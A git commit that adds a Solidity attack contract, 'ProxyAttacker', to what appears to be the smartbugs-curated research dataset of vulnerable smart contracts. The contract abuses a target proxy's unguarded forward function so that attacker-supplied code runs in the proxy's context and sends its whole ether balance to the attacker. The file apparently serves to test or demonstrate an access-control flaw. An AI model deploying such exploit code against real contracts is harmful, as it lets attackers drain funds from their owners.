13a099b2334608d3a6331e12c15136cf262fe9db
Monica Jin <monicachenjin@gmail.com>
2024-07-23 16:23:39 +0100

    add: proxy exploit

---
+++ smartbugs-curated/0.4.x/contracts/access_control/proxy_attack.sol
@@ -0,0 +1,24 @@
+pragma solidity ^0.4.24;
+
+import "../dataset/access_control/proxy.sol";
+
+contract ProxyAttacker {
+
+    Proxy public target;
+
+    constructor(Proxy _target) public {
+        target = _target;
+    }
+
+    function attack() public {
+        target.forward(address(this),
+        abi.encodeWithSignature("call(address)", address(this)));
+    }
+
+    function call(address receiver) public {
+        receiver.transfer(address(this).balance);
+    }
+
+    function() public payable {}
+
+}
